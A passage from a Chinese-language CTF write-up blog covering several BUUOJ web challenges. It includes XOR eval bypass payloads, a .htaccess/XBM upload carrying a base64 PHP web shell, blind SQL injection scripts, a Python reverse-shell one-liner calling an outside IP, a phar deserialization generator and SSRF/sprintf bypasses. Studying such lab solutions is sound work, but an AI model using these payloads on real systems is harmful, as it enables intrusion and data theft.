<p>最后通过 count_chars() 函数来限制该值中不同字符的个数</p>
<p>很明显需要我们通过eval调用get_the_flag函数，然后上传bypass文件，最后拿到shell拿到flag。</p>
<p><strong>Payload : ${xxxx^xxxx}{x}();&amp;x= …</strong> , 转换后就变成了 <strong>$_GET[x]();&amp;x= …</strong></p>
</blockquote>
<p>放几个有用的脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断保留字</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, chr(<span class="variable">$i</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> chr(<span class="variable">$i</span>).<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//异或生成</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$l</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$r</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$argv</span> = str_split(<span class="string">&quot;_GET&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$argv</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">255</span>;<span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = chr(<span class="variable">$j</span>)^chr(<span class="number">255</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$k</span> == <span class="variable">$argv</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                <span class="variable">$l</span> .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">                <span class="variable">$r</span> .= <span class="string">&quot;%0&quot;</span> . dechex(<span class="variable">$j</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$l</span> .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">            <span class="variable">$r</span> .= <span class="string">&quot;%&quot;</span> . dechex(<span class="variable">$j</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\&#123;<span class="subst">$l</span>`<span class="subst">$r</span>\&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload1:</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span>A<span class="number">0</span><span class="meta">%</span>B<span class="number">8</span><span class="meta">%</span>BA<span class="meta">%</span>AB^<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff&#125;&#123;<span class="meta">%</span>A<span class="number">0</span>&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span>A<span class="number">0</span>=get_the_flag</span><br></pre></td></tr></table></figure>




<p>第二关</p>
<blockquote>
<p>首先对文件后缀进行正则检查 , 如果文件后缀是以 “ ph “ 开头 , 则不通过检测 .</p>
<p>然后对文件内容进行检查 , 如果文件内容中出现 “ &lt;? “ 这个部分 , 则不通过检测 .</p>
<p>最后通过 exif_imagetype() 函数对文件类型进行检查 , 如果文件不是一张图片 , 则不通过检测 .</p>
</blockquote>
<p><strong>PHP版本是 PHP 7.2 , 所以<code>&lt;script language=&#39;php&#39;&gt; ... &lt;/script&gt;</code>这种写法已无法使用 . 要想绕过 “ &lt;? “ 的检测 , 必须对文件内容进行编码(比如base64)再上传</strong> .</p>
<p> 找到一种能够同时满足 图片文件 . PHP文件 , .htaccess文件 的文件格式 . <strong>要满足PHP文件和配置文件的格式 ，就需要添加文件的 “ 不解析行 “ 了( 比如注释行 )</strong></p>
<p><strong>X-Bitmap(XBM)是一种古老但通用的图像文件格式 , 它与现在的许多Web浏览器都兼容 . X-Windows图形界面(UNIX和Linux常用的GUI)的C代码库xlib中有一个组件专门描述了它的规范 .</strong></p>
<p><strong>XBM 文件头是通过两行 #define 定义的 , 而这种定义方式刚好在 php文件 和 .htaccess文件 中代表注释</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.htaccess</span><br><span class="line"></span><br><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;shell.aaa&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">shell</span>.aaa:</span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF89a12</span>		#<span class="number">12</span>是为了补足<span class="number">8</span>个字节，满足base<span class="number">64</span>编码的规则</span><br><span class="line"><span class="attribute">PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs</span>/Pg==</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#paylaod</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .ahhh</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.aaa&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shell = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://be57968d-71f2-4a55-afda-5d2b4348fcc7.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;upload&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.aaa&#x27;</span>,shell,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>


<p>第三关：</p>
<p>bypass  open_basedir</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">&#x27;img&#x27;</span>);<span class="selector-tag">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="selector-tag">echo</span>(file_get_contents(<span class="string">&#x27;flag&#x27;</span>));</span><br></pre></td></tr></table></figure>


<p><a href="https://www.guildhab.top/?p=677" target="_blank">大佬对这个题的分析，写的挺详细的</a></p>
<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020] Ezsqli"></a>[GYCTF2020] Ezsqli</h2><p><strong>知识点：</strong></p>
<ol>
<li> <strong>bypass information_schema</strong></li>
<li> <strong>无列名注入</strong></li>
</ol>
<p><strong>由于performance_schema过于复杂，所以mysql在5.7版本中新增了sys 数据库，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</strong></p>
<p><strong>sys数据库中的以下三个视图中存储了表名table_name:</strong></p>
<ul>
<li><strong>sys.schema_auto_increment_columns #存在自增主键的表会出现在此视图</strong></li>
<li><strong>sys.schema_table_statistics_with_buffer #数据来源视图</strong></li>
<li><strong>sys.x$schema_table_statistics_with_buffer #数据来源视图</strong></li>
</ul>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">string</span></span><br><span class="line">url=<span class="string">&quot;http://334f9701-ac6e-4158-b91b-450d336d1ca1.node3.buuoj.cn/&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">50</span>):<span class="meta">#flag长度</span></span><br><span class="line">    <span class="built_in">print</span>(i,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    high=<span class="number">128</span></span><br><span class="line">    mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=high:</span><br><span class="line">        <span class="meta">#print(mid)</span></span><br><span class="line">    <span class="meta">#for j in range(32,128):#可见字符长度</span></span><br><span class="line">    	<span class="meta">#payload=<span class="meta-string">&quot;0^(ascii(substr(select database()),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.format(i,mid)</span></span><br><span class="line">    	<span class="meta">#payload=<span class="meta-string">&quot;0^(ascii(substr(select version()),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.format(i,mid)</span></span><br><span class="line">        <span class="meta">#payload=<span class="meta-string">&quot;0^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.format(i,mid)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload</span><br><span class="line">            &#125;</span><br><span class="line">        t = requests.post(url,data=data)</span><br><span class="line">        <span class="meta">#print(t.apparent_encoding)</span></span><br><span class="line">        t.encoding=<span class="string">&quot;Windows-1252&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(t.<span class="built_in">text</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;Nu1L&quot;</span> in t.<span class="built_in">text</span>):</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            mid = (low+high)<span class="comment">//2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid<span class="number">-1</span></span><br><span class="line">            mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    flag+=chr(high+<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">爆出表名为f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure>
<p>盲猜列名为flag ，直接得到flag</p>
<p>2.无列名注入</p>
<p>在这里用到的是逐字符检索数据法</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select (select 1,<span class="emphasis">&#x27;c&#x27;</span>) &gt; (select * from users limit 0,1);</span><br><span class="line"><span class="code">+------------------------------------------------------------+</span></span><br><span class="line">| (select 1,<span class="emphasis">&#x27;c&#x27;</span>) &gt; (select * from users limit 0,1)           |</span><br><span class="line"><span class="code">+------------------------------------------------------------+</span></span><br><span class="line">|                              0                             |</span><br><span class="line"><span class="code">+------------------------------------------------------------+</span></span><br><span class="line">mysql&gt; select (select 1,<span class="emphasis">&#x27;d&#x27;</span>) &gt; (select * from users limit 0,1);</span><br><span class="line"><span class="code">+------------------------------------------------------------+</span></span><br><span class="line">| (select 1,<span class="emphasis">&#x27;d&#x27;</span>) &gt; (select * from users limit 0,1)           |</span><br><span class="line"><span class="code">+------------------------------------------------------------+</span></span><br><span class="line">|                              1                             |</span><br><span class="line"><span class="code">+------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">//说明第二个字段的第一位是c,以此类推</span></span><br></pre></td></tr></table></figure>


<p>paylaod:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://334f9701-ac6e-4158-b91b-450d336d1ca1.node3.buuoj.cn/&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(j,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid=(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;=high:</span><br><span class="line">        print(mid)</span><br><span class="line">        flag1=flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">        payload=<span class="string">&quot;0^((1,&#x27;&#123;0&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(flag1)</span><br><span class="line">        data=&#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>:payload</span><br><span class="line">                &#125;</span><br><span class="line">        t = requests.post(url,data=data)</span><br><span class="line">        t.encoding=<span class="string">&quot;Windows-1252&quot;</span></span><br><span class="line">        <span class="comment">#print(t.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            high=mid-<span class="number">1</span></span><br><span class="line">            mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">            mid=(low+high)//<span class="number">2</span>       </span><br><span class="line">    print(flag,<span class="built_in">chr</span>(high))</span><br><span class="line">    flag+=<span class="built_in">chr</span>(high)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>反弹shll</strong></li>
<li><strong>/proc/[pid]/fd</strong></li>
</ol>
<p>1.反弹shell </p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://c<span class="number">936</span>c<span class="number">7</span>ee-<span class="number">5778</span>-<span class="number">4</span>eab-afc<span class="number">5</span>-<span class="number">1</span>b<span class="number">1</span>e<span class="number">3</span>ce<span class="number">54106</span>.node<span class="number">3</span>.buuoj.cn/shell?c=python<span class="number">3</span> -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;172.16.189.110&#x27;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>/proc/[pid]/fd</li>
</ol>
<p><strong>当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里。</strong></p>
<p><strong>在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用 rm -f flag.txt）删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu9.jpg"></p>
<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>考察点：phar反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$c</span>-&gt;params=<span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> C1e4r();</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);  <span class="comment">//生成phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);   <span class="comment">//触发头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);   <span class="comment">//生成签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>






<h2 id="BJDCTF-2nd-文件探测"><a href="#BJDCTF-2nd-文件探测" class="headerlink" title="[BJDCTF 2nd]文件探测"></a>[BJDCTF 2nd]文件探测</h2><p>知识点：</p>
<ol>
<li>文件包含</li>
<li>SSRF</li>
<li>session伪造</li>
</ol>
<p>1.文件包含</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">home.php?file=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=system</span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filter1</span> = <span class="string">&#x27;/^http:\/\/127\.0\.0\.1\//i&#x27;</span>;</span><br><span class="line"><span class="variable">$filter2</span> = <span class="string">&#x27;/.?f.?l.?a.?g.?/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q3&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;q2&#x27;</span>].<span class="string">&quot;.y1ng.txt&quot;</span>;</span><br><span class="line">    <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;q3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str1</span> = <span class="string">&quot;~$ python fuck.py -u \&quot;&quot;</span>.<span class="variable">$url</span> .<span class="string">&quot;\&quot; -M <span class="subst">$method</span> -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="variable">$filter1</span>, <span class="variable">$url</span>) )&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$str2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$filter2</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$str3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/^GET/i&#x27;</span>, <span class="variable">$method</span>) &amp;&amp; !preg_match(<span class="string">&#x27;/^POST/i&#x27;</span>, <span class="variable">$method</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$str4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$detect</span> = @file_get_contents(<span class="variable">$url</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">&quot;<span class="subst">$url</span> method&amp;content_size:<span class="subst">$method</span>%d&quot;</span>, <span class="variable">$detect</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>2.SSRF</p>
<ol>
<li>根据上面代码，我们可以分析得到：<ul>
<li>q1 没有限制</li>
<li>q2 要以 <a href="http://127.0.0.1开头,且后面会连接一个/">http://127.0.0.1开头，且后面会连接一个</a> y1ng.txt 然后可以被返回。</li>
<li>q3 必须是GET或者POST 开头</li>
</ul>
</li>
<li>基本上可以判定是ssrf了，有几个地方需要绕过一下：<ul>
<li>q2会被加上y1ng.txt 怎么才能让他的连接不起作用呢。</li>
<li>sprintf将q2输出格式是%d 也就是输出不完整，我们需要%s 来输出。</li>
</ul>
</li>
</ol>
<p><strong>去掉url拼接的.y1ng.txt</strong></p>
<p> <strong>我们只需要将后面接一个不存在的get参数就可以绕过了。例如：<code>http://127.0.0.1/xxxxxxxx.php?mayi=666y1ng.txt</code> 他最后显示的页面还是<code>http://127.0.0.1/xxxxxxxx.php</code> 这样就可以成功绕过了。</strong><br> <strong>同时还可以利用锚点</strong><br><code>http://127.0.0.1/xxxxxxxx.php#666y1ng.txt</code></p>
<p><strong>sprintf输出格式问题</strong></p>
<p><strong><code>sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect)</code>我们可以知道 %d 前面还有一个可以控制的变量，也就是我们传入的<code>q3</code>。经过了解，我们知道在sprintf这里面 <code>%</code> 才是转义字符，我们可以传入<code>POST%s%</code>最后把<code>%d</code>给取消转义。达到绕过效果</strong></p>
<p><strong>还有一种方法 %1$s  ——  这种办法原理是%1$s会将第一个参数用string类型输出，这道题中第一个参数便是admin.php的源码</strong></p>
<p>payload：</p>
<blockquote>
<p>q1=1&amp;q2=<a href="http://127.0.0.1/admin.php#&amp;q3=GET%1$s">http://127.0.0.1/admin.php#&amp;q3=GET%1$s</a> </p>
</blockquote>
<p>3.session伪造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$f1ag</span> = ‘f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;‘; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = ‘AES<span class="number">-128</span>-CBC‘;</span><br><span class="line">    <span class="variable">$iv</span> = md5(<span class="variable">$_SERVER</span>[‘REMOTE_ADDR‘],<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt(<span class="variable">$data</span>, <span class="variable">$method</span>,<span class="variable">$key</span>, OPENSSL_RAW_DATA , <span class="variable">$iv</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[‘your_ip_address‘]) &amp;&amp; <span class="variable">$_COOKIE</span>[‘your_ip_address‘] === md5(<span class="variable">$_SERVER</span>[‘REMOTE_ADDR‘]) &amp;&amp; <span class="variable">$_COOKIE</span>[‘y1ng‘] === sha1(md5(‘y1ng‘)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_SERVER</span>[‘REMOTE_ADDR‘] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=‘10px‘ color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot;</span> . <span class="variable">$_SERVER</span>[‘REMOTE_ADDR‘];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[‘user‘] = md5(<span class="variable">$_SERVER</span>[‘REMOTE_ADDR‘]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[‘decrypt‘])) &#123;</span><br><span class="line">    <span class="variable">$decr</span> = <span class="variable">$_GET</span>[‘decrypt‘];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_SESSION</span>[‘secret‘];</span><br><span class="line">        <span class="keyword">include</span> ‘flag_2sln2ndln2klnlksnf.php‘;</span><br><span class="line">        <span class="variable">$cipher</span> = aesEn(<span class="variable">$data</span>, ‘y1ng‘);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$decr</span> === <span class="variable">$cipher</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(‘爬‘);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">&quot;Refresh:0.1;url=index.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    <span class="variable">$length</span> = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[‘secret‘] = bin2hex(random_bytes(<span class="variable">$length</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过分析代码发现有两个要求</p>
<blockquote>
<p>X-Forwarded-For:127.0.0.1</p>
<p>$decr === $cipher</p>
</blockquote>
